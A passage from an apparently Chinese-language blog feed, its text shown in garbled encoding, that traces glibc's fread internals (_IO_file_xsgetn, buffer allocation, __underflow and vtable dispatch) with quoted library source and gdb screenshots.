JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta"> (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS) \</span></span><br><span class="line"><span class="meta">   + (THIS)-&gt;_vtable_offset))</span></span><br></pre></td></tr></table></figure><p>æˆ‘ç®€å•åˆ†æä¸€ä¸‹ä¸Šè¿°éƒ¨åˆ†ï¼Œæ ¸å¿ƒå°±æ˜¯_IO_JUMPS_FUNC(THIS)è¿”å›äº†_IO_jump_tåœ°å€ï¼Œç”±äºJUMP2ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯__xsgetnï¼Œæ‰€ä»¥-&gt;FUNCè®¿é—®çš„å°±æ˜¯_IO_jump_tç»“æ„ä½“ä¸­__xsgetn,ç„¶åæˆ‘ä»¬ç”¨gdbçœ‹ä¸‹æ­¤æ—¶çš„_IO_jump_tç»“æ„ä½“ä¸­çš„å€¼(å¦‚ä¸‹)ï¼Œå› æ­¤æœ€åæˆ‘ä»¬è·³è½¬åˆ°äº†0x7ffff7a86df0å¤„ã€‚</p><img src="https://s2.loli.net/2022/08/11/YXtvqDUhJs4b3wC.png" alt="image-20220810102706007" style="zoom:50%;" /><p>ç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸‹æ±‡ç¼–å¦‚ä½•å®ç°çš„è¿™é‡Œã€‚</p><img src="https://s2.loli.net/2022/08/11/eSmUDlx1iQtk4NG.png" alt="image-20220810103020508" style="zoom:50%;" /><p>å…ˆæ˜¯è®©rdi+0xd8æŒ‡å‘çš„å†…å®¹èµ‹å€¼ç»™äº†raxå¯„å­˜å™¨ã€‚è€Œ<strong>æ­¤æ—¶çš„rdiå°±æ˜¯_IO_list_allçš„å€¼</strong>ï¼ŒåŠ ä¸Š0xd8è¿™ä¸ªåç§»ï¼Œæ­£å¥½å°±æ˜¯_IO_FILE_plusç»“æ„ä½“ä¸­çš„vtableå­—æ®µã€‚åŠ ä¸Š[]å¯»å€åï¼Œä¹Ÿå°±æ˜¯æ‹¿åˆ°äº†_IO_jump_tç»“æ„ä½“çš„åœ°å€ã€‚</p><p>ç„¶åç¬¬äºŒæ¡æŒ‡ä»¤æ˜¯<code>mov    rax, qword ptr [rax + 0x40]</code>ï¼Œè€Œ_IO_jump_tç»“æ„ä½“ä¸­åç§»0x40çš„å­—æ®µæ­£å¥½å°±æ˜¯__xsgetn(å¦‚ä¸‹å›¾)</p><p><img src="https://s2.loli.net/2022/08/11/XMZ3fpkr9HPCUse.png" alt="image-20220810104331302"></p><p>æœ€ååŠ ä¸Š[]å¯»å€ï¼Œraxä¸º0x7ffff7a86df0(å¦‚ä¸‹å›¾)</p><img src="https://s2.loli.net/2022/08/11/KMEgbmJIB2tuXR7.png" alt="image-20220810104747743" style="zoom:50%;" /><p>å¦‚æ­¤ï¼Œæœ€ç»ˆjmp raxï¼ŒæˆåŠŸè·³è½¬åˆ°_IO_file_xsgetnå‡½æ•°(å¦‚ä¸‹å›¾)ï¼Œè€Œè¿™ä¸ª_IO_file_xsgetnå‡½æ•°ä¹Ÿæ˜¯freadå‡½æ•°å®ç°çš„æ ¸å¿ƒå‡½æ•°ã€‚</p><p><img src="https://s2.loli.net/2022/08/11/nbiIR5wgJdTWEc1.png" alt="image-20220810104948954"></p><h3 id="IO-file-xsgetnå‡½æ•°"><a href="#IO-file-xsgetnå‡½æ•°" class="headerlink" title="_IO_file_xsgetnå‡½æ•°"></a>_IO_file_xsgetnå‡½æ•°</h3><p>_IO_file_xsgetnå‡½æ•°ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†(ä¸‹é¢å…ˆæ˜¯å¯¹ä¸‰ä¸ªéƒ¨åˆ†çš„ç®€å•æ¦‚æ‹¬ï¼Œåé¢æ˜¯å¯¹ä¸‰ä¸ªéƒ¨åˆ†çš„å…·ä½“åˆ†æ)ï¼š</p><p>1ã€å…ˆæ˜¯å»åˆ¤æ–­fp-&gt;_IO_buf_base(reserve area)æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºçš„è¯ï¼Œå°±è¯´æ˜resever areaè¿˜æ²¡æœ‰è¢«åˆ†é…å‡ºæ¥ï¼Œå› æ­¤å»è°ƒç”¨_IO_doallocbufå‡½æ•°æ¥åˆ†é…ä¸€ä¸ªreserve areaï¼ˆæºç å¦‚ä¸‹ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>2ã€å¦‚æœè¾“å…¥ç¼“å†²åŒºå‰©ä½™çš„å¤§å°ä¸ä¸ºç©ºï¼Œå¹¶ä¸”è¿˜éœ€è¦è¯»å…¥ä¸€å®šå­—èŠ‚çš„æ•°æ®ï¼Œå°±è°ƒç”¨memcpyå‡½æ•°ï¼Œå°†è¾“å…¥ç¼“å†²åŒºçš„æ•°æ®å¤åˆ¶åˆ°æŒ‡çš„çš„å†…å­˜å¤„ã€‚haveä¸ºè¾“å…¥ç¼“å†²åŒºå‰©ä½™å¤§å°ï¼Œwantä¸ºè¿˜è¦è¯»å…¥çš„å­—èŠ‚æ•°ã€‚ï¼ˆæºç å¦‚ä¸‹ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      s += have;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>3ã€å¦‚æœè¾“å…¥ç¼“å†²åŒºå‰©ä½™å¤§å°ä¸º0ï¼Œå¹¶ä¸”å­˜åœ¨resever area(è¿™ç‰‡åŒºåŸŸå°±æ˜¯fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)ï¼Œä¸”æˆ‘ä»¬éœ€æ±‚sizeæ¯”resever areaåŒºåŸŸå°ã€‚é‚£ä¹ˆè°ƒç”¨__underflowå‡½æ•°æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readè¯»å…¥ä¸€å®šå­—èŠ‚çš„æ•°æ®åˆ°resever areaä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">     &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">continue</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ†é…resever-area"><a href="#åˆ†é…resever-area" class="headerlink" title="åˆ†é…resever area"></a>åˆ†é…resever area</h3><p>å…ˆæ¥çœ‹ç¬¬ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯å¦‚æœä¸å­˜åœ¨resever areaçš„æƒ…å†µä¸‹è°ƒç”¨_IO_doallocbufå‡½æ•°æ¥åˆ†é…ä¸€ä¸ªresever areaã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_doallocbuf (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)<span class="comment">//å¦‚æœå­˜åœ¨resever area(ä¿ç•™åŒº)çš„è¯ï¼Œå°±ç›´æ¥è¿”å›</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)<span class="comment">//è°ƒç”¨äº†vtableä¸­çš„å‡½æ•°</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡æ‰§è¡Œfreadå‡½æ•°ï¼Œæ‰€ä»¥è‚¯å®šæ˜¯ä¼šè°ƒç”¨_IO_doallocbuf å‡½æ•°çš„ã€‚é€šè¿‡è§‚å¯Ÿä¸Šé¢çš„æºç å’Œä¸‹é¢çš„å›¾ç‰‡å‘ç°åœ¨è¿™ä¸ª_IO_doallocbufå‡½æ•°ä¸­åˆè°ƒç”¨äº†_IO_FILEçš„vtableä¸­çš„IO_file_doallocateå‡½æ•°(å¦‚ä¸‹å›¾)</p><img src="https://s2.loli.net/2022/08/11/RDSyKFhG6QXtVpN.png" alt="image-20220810172752189" style="zoom:50%;" /><p>æˆ‘è¿™é‡Œå°±ä¸æ”¾IO_file_doallocateå‡½æ•°çš„æºä»£ç äº†ï¼Œè°ƒè¯•çœ‹ä¸€ä¸‹æµç¨‹å§ã€‚</p><img src="https://s2.loli.net/2022/08/11/hLblpx6KDswty73.png" alt="image-20220810174150826" style="zoom:50%;" /><p>siè¿›å…¥IO_file_doallocateå‡½æ•°åï¼Œåˆè°ƒç”¨äº†vtableä¸­çš„_IO_file_statå‡½æ•°ã€‚</p><img src="https://s2.loli.net/2022/08/11/c8VsSxhIEaXf4LG.png" alt="image-20220810174515007" style="zoom:50%;" /><p>è€Œååˆæ‰§è¡Œäº†ç³»ç»Ÿè°ƒç”¨fstatï¼Œè¿™ä¸ªç³»ç»Ÿè°ƒç”¨æ˜¯æ¥è·å–æ–‡ä»¶çŠ¶æ€ï¼Œå¹¶ä¸”åˆå§‹åŒ–stç»“æ„ä½“çš„ã€‚å¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„st_blksizeä¸º4096(å¦‚ä¸‹å›¾)</p><img src="https://s2.loli.net/2022/08/11/9t1UW8wcAHm3fBP.png" alt="image-20220810175134043" style="zoom:50%;" /><p>è€Œè¿™ä¸ªst_blksizeä¹Ÿå°±æ˜¯æ¥ä¸‹æ¥mallocç”³è¯·çš„å†…å­˜å¤§å°ï¼ˆä¹Ÿå°±æ˜¯reserve areaçš„å¤§å°ï¼‰</p><img src="https://s2.loli.net/2022/08/11/dcANr24xuBPn5jq.png" alt="image-20220810175357303" style="zoom:50%;" /><p>å½“mallocå‡½æ•°å°†å†…å­˜ç”³è¯·å‡ºæ¥åï¼Œè°ƒç”¨äº†vtableä¸­çš„_IO_setbå‡½æ•°(å¦‚ä¸‹)</p><img src="https://s2.loli.net/2022/08/11/cULi7ys3RaOpBrv.png" alt="image-20220810175823556" style="zoom:50%;" /><p>è¿™ä¸ªå‡½æ•°çš„ä»£ç å¾ˆçŸ­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡é˜…è¯»ä¸Šé¢çš„æºä»£ç å°±æ˜ç™½ï¼Œè¿™ä¸ªå‡½æ•°ä¸»è¦å°±æ˜¯å¯¹_IO_buf_baseå’Œ_IO_buf_endæŒ‡é’ˆè¿›è¡Œèµ‹å€¼ã€‚è‡³æ­¤_IO_doallocbufå‡½æ•°å°±ç»“æŸäº†ã€‚<strong>_IO_doallocbufå‡½æ•°ä¸»è¦æ˜¯å°†resever areaç”³è¯·å‡ºæ¥(å¤§å°ä¸º0x1000),å¹¶ä¸”å¯¹_IO_buf_baseå’Œ_IO_buf_endæŒ‡é’ˆè¿›è¡Œèµ‹å€¼</strong>ã€‚</p><h3 id="ä»è¾“å…¥ç¼“å†²åŒºä¸­æ‹·è´æ•°æ®"><a href="#ä»è¾“å…¥ç¼“å†²åŒºä¸­æ‹·è´æ•°æ®" class="headerlink" title="ä»è¾“å…¥ç¼“å†²åŒºä¸­æ‹·è´æ•°æ®"></a>ä»è¾“å…¥ç¼“å†²åŒºä¸­æ‹·è´æ•°æ®</h3><p>ç¬¬äºŒéƒ¨åˆ†æ˜¯æœ€ç®€å•çš„ï¼Œç»“åˆä¸‹é¢çš„æºç å¾ˆå®¹æ˜“åˆ†æå‡ºæ¥ï¼Œæ‹·è´æˆ‘ä»¬æŒ‡å®šçš„å­—èŠ‚çš„å†…å®¹ä»è¾“å…¥ç¼“å†²åŒºçš„å‰©ä½™éƒ¨åˆ†åˆ°æŒ‡å®šåœ°å€ï¼Œä½†å¦‚æœè¾“å…¥ç¼“å†²åŒºå‰©ä½™å¤§å°ä¸ºç©ºçš„è¯ï¼Œå°±æ— æ³•å»æ‹·è´ã€‚</p><p><strong>(haveä¸ºè¾“å…¥ç¼“å†²åŒºå‰©ä½™å¤§å°ï¼Œwantä¸ºè¿˜è¦è¯»å…¥çš„å­—èŠ‚æ•°)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      s += have;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readè¯»å…¥æ•°æ®"><a href="#æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readè¯»å…¥æ•°æ®" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readè¯»å…¥æ•°æ®"></a>æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readè¯»å…¥æ•°æ®</h3><p>ç¬¬ä¸‰éƒ¨åˆ†çš„æ ¸å¿ƒæ˜¯__underflowå‡½æ•°ã€‚å®ƒå…ˆæ˜¯ç»è¿‡ä¸€äº›æ£€æŸ¥åï¼Œå»è°ƒç”¨äº†vtableä¸­çš„_IO_file_underflowå‡½æ•°ã€‚æ£€æŸ¥å¦‚ä¸‹ï¼Œè°ƒç”¨vtableä¸­çš„_IO_file_underflowå‡½æ•°æ˜¯åœ¨__underflowå‡½æ•°å°†è¦è¿”å›ä¹‹æ—¶æ‰§è¡Œçš„_IO_UNDERFLOW (fp)ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line"><span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/08/11/7FsBWa1IfY56eiD.png" alt="image-20220810181956710"></p><p>å› ä¸ºå®å®šä¹‰<code># define _IO_new_file_underflow _IO_file_underflow</code>ï¼Œæ‰€ä»¥_IO_file_underflowåœ¨æºç ä¸­ä¸º_IO_new_file_underflow.</p><p>ç„¶åä¸Šæ¥å°±æ˜¯å¾ˆå¤šæ£€æŸ¥ï¼Œä¸è¿‡æ ¹æ®ç¨‹åºå½“å‰çš„çŠ¶æ€ï¼Œç›´æ¥è·³è¿‡äº†å‰é¢çš„æ£€æŸ¥ã€‚å…ˆå»æ‰§è¡Œäº†_IO_switch_to_get_mode å‡½æ•°ï¼Œè¯¥å‡½æ•°å°†fp-&gt;_IO_read_baseè¿›è¡Œäº†èµ‹å€¼ï¼Œå…¶ä»–æŒ‡é’ˆä¾ç„¶ä¸º0ã€‚</p><p>ç­‰åˆ°_IO_switch_to_get_modeå‡½æ•°æ‰§è¡Œç»“æŸï¼Œå‡ºæ¥ä¹‹åå°±æ˜¯ç–¯ç‹‚çš„å¯¹readå’Œwriteå­—æ®µè¿›è¡Œèµ‹å€¼ï¼Œè¿™é‡Œéƒ½åˆå§‹åŒ–ä¸ºäº†_IO_buf_baseï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">  = fp-&gt;_IO_buf_base;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶çš„_IO_FILEç»“æ„ä½“å„ä¸ªå­—æ®µå¦‚ä¸‹</p><img src="https://s2.loli.net/2022/08/11/7NyOSiozVua2W3l.png" alt="image-20220810183427096" style="zoom:50%;" /><p>ç„¶åæ­¤æ—¶è°ƒç”¨äº†è™šè¡¨ä¸­çš„_IO_file_readå‡½æ•°(å¦‚ä¸‹å›¾)</p><p><img src="https://s2.loli.net/2022/08/11/2wpmz16rJixnuAE.png" alt="image-20220810183730754"></p><p>è€Œåè¯¥å‡½æ•°è¿›è¡Œäº†ç³»ç»Ÿè°ƒç”¨readï¼Œå®ƒçš„ç¬¬äºŒä¸ªå‚æ•°ä¹Ÿå°±æ˜¯fp-&gt;_IO_buf_baseçš„å€¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_baseçš„å€¼ã€‚æ­¤æ—¶ä¹Ÿæ‰ç»ˆäºå°†æ–‡ä»¶ä¸­çš„æ•°æ®è¯»å…¥åˆ°äº†resever areaä¸­(æˆ‘è®¤ä¸ºç°åœ¨æ•°æ®è¿˜å¹¶ä¸æ˜¯åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ï¼Œå› ä¸ºæŒ‰ç…§å®šä¹‰çš„è¯_IO_read_end  _IO_read_baseä¹‹é—´çš„æ‰å±äºè¾“å…¥ç¼“å†²åŒºï¼Œè€Œç°åœ¨è¿˜æ²¡æœ‰æŒªåŠ¨_IO_read_endæŒ‡é’ˆï¼Œå› æ­¤ä¸¥è°¨ä¸€äº›çš„è¯ï¼Œç°åœ¨æ•°æ®æ˜¯å±äºresever areaä¸­çš„)</p><p><img src="https://s2.loli.net/2022/08/11/ukGAYwK3PVNv1ly.png" alt="image-20220810184138466"></p><p>è€Œå_IO_SYSREADå‡½æ•°è¿”å›ï¼Œreadç³»ç»Ÿè°ƒç”¨è¯»å…¥çš„å­—èŠ‚æ•°è¿”å›ç»™å˜é‡countã€‚æ­¤æ—¶æ‰§è¡Œåˆ°fp-&gt;_IO_read_end +&#x3D; countæ‰ç®—æ˜¯å°†_IO_read_end çš„æŒ‡é’ˆç§»åŠ¨ï¼Œç°åœ¨å¯ä»¥è¯´æ˜¯åˆšåˆšå†™å…¥çš„æ•°æ®ä½äºäº†è¾“å…¥ç¼“å†²åŒºä¸­ã€‚</p><p><img src="https://s2.loli.net/2022/08/11/JnxizwrePEjB9Ts.png" alt="image-20220810185946550"></p><p>ç”±äºç¬¬äºŒéƒ¨åˆ†å’Œç¬¬ä¸‰éƒ¨åˆ†æ˜¯ä½äºwhileå¾ªç¯ä¸­çš„ï¼Œå› æ­¤ç¬¬ä¸‰éƒ¨åˆ†æ‰§è¡Œåï¼Œå†æ¬¡æ¥åˆ°äº†ç¬¬äºŒéƒ¨åˆ†ã€‚è¿™å›fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptrçš„å€¼æ˜¯å­˜åœ¨çš„ï¼Œæ‰€ä»¥è¿™æ¬¡å°±å¯ä»¥è¿›å…¥ifå»æ‰§è¡Œmemcpyå‡½æ•°äº†(å¦‚ä¸‹)</p><img src="https://s2.loli.net/2022/08/11/Z28dwmJCfMTI1LA.png" alt="image-20220810190631208" style="zoom:50%;" /><p>å…œå…œè½¬è½¬äº†å¾ˆä¹…ï¼Œä¸€ç›´éƒ½æ˜¯å›´ç»•ç€æ•°æ®ä»æ–‡ä»¶ä¸­å†™åˆ°è¾“å…¥ç¼“å†²åŒºä¸­çš„æ“ä½œï¼Œç»ˆäºåˆ°äº†memcpyå‡½æ•°ï¼Œé€šè¿‡è¿™ä¸ªæ‹·è´å‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¾“å…¥ç¼“å†²åŒºä¸­çš„æ•°æ®æ‹·è´æŒ‡å®šçš„å­—èŠ‚æ•°åˆ°æŒ‡å®šçš„åœ°å€ï¼Œæœ€åå°†æŒ‡é’ˆ_IO_read_ptrè¿›è¡Œæ›´æ–°(å¦‚ä¸‹å›¾)ï¼ŒåŒæ—¶å°†wantç½®é›¶ã€‚</p><img src="https://s2.loli.net/2022/08/11/wFEjuN5IMZfL3ns.png" alt="image-20220810191534235" style="zoom:50%;" /><p>è¯¥freadå‡½æ•°çš„æºç åˆ†æè‡³æ­¤å°±ç»“æŸäº†ï¼Œçœ‹ä¸€ä¸‹æœ€åçš„_IO_FILEç»“æ„ä½“</p><img src="https://s2.loli.net/2022/08/11/6PqiupBO3AMNLf4.png" alt="image-20220810200528302" style="zoom:50%;" /><h2 id="æ€»ç»“freadå‡½æ•°è°ƒç”¨æµç¨‹ï¼š"><a href="#æ€»ç»“freadå‡½æ•°è°ƒç”¨æµç¨‹ï¼š" class="headerlink" title="æ€»ç»“freadå‡½æ•°è°ƒç”¨æµç¨‹ï¼š"></a>æ€»ç»“freadå‡½æ•°è°ƒç”¨æµç¨‹ï¼š</h2><p>å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨reserve area(æ²¡æœ‰çš„è¯å°±mallocç”³è¯·å‡ºæ¥)ï¼Œå†å»åˆ¤æ–­è¾“å…¥ç¼“å†²åŒºæ˜¯å¦è¿˜æœ‰å‰©ä½™åŒºåŸŸï¼Œå¦‚æœæœ‰çš„è¯å°±ç›´æ¥æ‹·è´è¾“å…¥ç¼“å†²åŒºå‰©ä½™éƒ¨åˆ†çš„æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œæ‰§è¡Œç³»ç»Ÿè°ƒç”¨readä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®åˆ°è¾“å…¥ç¼“å†²åŒºä¸­ï¼Œç„¶åå¾ªç¯å†æ¬¡å»æ‰§è¡Œmemcpyå‡½æ•°æ‹·è´è¾“å…¥ç¼“å†²åŒºçš„æ•°æ®ã€‚</p><p>å› ä¸ºæ˜¯åˆå­¦IOï¼Œå› æ­¤æœ‰äº›åœ°æ–¹å¯èƒ½ä¼šç†è§£æœ‰è¯¯ï¼Œå¦‚æœå­˜åœ¨é—®é¢˜æ¬¢è¿å¸ˆå‚…ä»¬æ–§æ­£</p><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><p><a href="https://www.anquanke.com/post/id/177958#h3-3">IO FILEä¹‹freadè¯¦è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p> <a href="http://blog.leanote.com/post/mut3p1g/file-struct">(leanote.com)</a></p><p><a href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fread">FILEç»“æ„ä½“åŠæ¼æ´åˆ©ç”¨æ–¹æ³• | Hacked By Fish_o0O (fish-o0o.github.io)</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fwrite_analysis">IO FILEä¹‹fwriteè¯¦è§£ Â« å¹³å‡¡è·¯ä¸Š (ray-cp.github.io)</a></p>]]></content>
      
      
      <categories>
          
          <category> æºç è°ƒè¯•&amp;&amp;åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æºç è°ƒè¯•&amp;&amp;åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOå­¦ä¹ --æºç åˆ†æfcloseå‡½æ•°</title>
      <link href="/posts/b5738aac.html"/>
      <url>/posts/b5738aac.html</url>
      
